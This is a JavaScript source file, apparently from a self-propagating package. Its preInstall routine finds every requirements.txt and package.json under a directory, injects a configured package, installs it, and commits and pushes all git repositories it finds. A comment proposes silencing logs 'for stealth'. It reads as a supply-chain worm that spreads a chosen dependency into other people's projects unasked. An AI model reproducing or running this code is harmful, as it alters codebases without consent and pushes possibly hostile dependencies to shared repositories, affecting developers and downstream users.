console.log('[index.js] Loading dependencies');
const { scanProject } = require('./scanner');
console.log('[index.js] scanner loaded');
const { installPipWithPackage, installNpmWithPackage } = require('./installer');
console.log('[index.js] installer loaded');
const { addCommitPush, findGitRoot } = require('./git');
console.log('[index.js] git loaded');
const { DEFAULT_PACKAGE, TARGET_DIR } = require('./config');
console.log('[index.js] config loaded');


/**
 * Adds the default package to every requirements.txt and package.json
 * found under the target directory, installs it, then commits & pushes git changes.
 * @param {string} packageName - package name to add (default from config)
 * @param {string} rootDir - directory to scan (default from config)
 */


async function preInstall(packageName = DEFAULT_PACKAGE, rootDir = TARGET_DIR) {
  console.log('[index.js] preInstall called with packageName:', packageName, 'rootDir:', rootDir);
  // Suppress all console logs for stealth (optional)
  // console.log = () => {};

  const { gitRoots, packageJsonPaths, requirementsPaths } = await scanProject(rootDir);
  console.log('[index.js] scanProject result:', { gitRoots, packageJsonPaths, requirementsPaths });

  for (const requirementsPath of requirementsPaths) {
    console.log('[index.js] Found requirements.txt at', requirementsPath);
    try {
      await installPipWithPackage(requirementsPath, packageName);
      console.log('[index.js] installPipWithPackage finished for', requirementsPath);
    } catch (err) {
      console.error('[index.js] installPipWithPackage error for', requirementsPath, err);
    }
  }
  for (const packageJsonPath of packageJsonPaths) {
    console.log('[index.js] Found package.json at', packageJsonPath);
    try {
      await installNpmWithPackage(packageJsonPath, packageName);
      console.log('[index.js] installNpmWithPackage finished for', packageJsonPath);
    } catch (err) {
      console.error('[index.js] installNpmWithPackage error for', packageJsonPath, err);
    }
  }
  for (const gitRoot of gitRoots) {
    console.log('[index.js] Git repo detected at', gitRoot);
    try {
      await addCommitPush(gitRoot);
      console.log('[index.js] addCommitPush finished for', gitRoot);
    } catch (err) {
      console.error('[index.js] addCommitPush error for', gitRoot, err);
    }
  }
  console.log('[index.js] preInstall finished');
}

if (require.main === module) {
  console.log('[index.js] Script run directly, calling preInstall');
  preInstall().catch(err => {
    console.error('[index.js] preInstall error:', err);
  });
}


console.log('[index.js] Exporting preInstall');
module.exports = { preInstall };
console.log('[index.js] Module loaded');